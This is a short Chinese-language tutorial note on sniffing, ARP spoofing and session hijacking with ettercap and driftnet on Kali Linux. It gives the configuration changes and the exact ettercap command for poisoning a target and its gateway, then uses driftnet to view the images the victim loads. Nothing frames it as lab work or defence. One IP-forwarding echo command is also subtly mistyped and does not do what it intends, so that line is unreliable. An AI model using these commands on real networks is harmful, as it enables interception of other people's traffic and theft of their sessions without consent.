<h3>嗅探，arp欺骗，会话劫持</h3>
工具：`Kali Linux` [`ettercap`](http://www.91ri.org/4408.html)
第一次需要配置
```
   /etc/ettercap/etter.conf
   ec_uid = 0
   ec_gid = 0
   [linux]
   if you use iptables 这行，将下面#去掉，打开转发。
```
```
   
   /etc/NetworkManager/NetworkManager.conf 
   [ifupdown]
   managed=true
```

改完后重启NetworkManager

```
   service network-manager restart
```

```
    cat /proc/sys/net/ipv4/ip_forward
    echo 1>>/proc/sys/net/ipv4/ip_forward
```

ettercap 
```
    ettercap -T -M arp /// /// -q -i eth0
```
第一个 `///` 是嗅探目标 --IP地址 <br>
第二个 `///` 是嗅探网络 --网关地址
`eth0` 是网卡编号

driftnet 显示访问图片
```
    driftnet -i eth0
```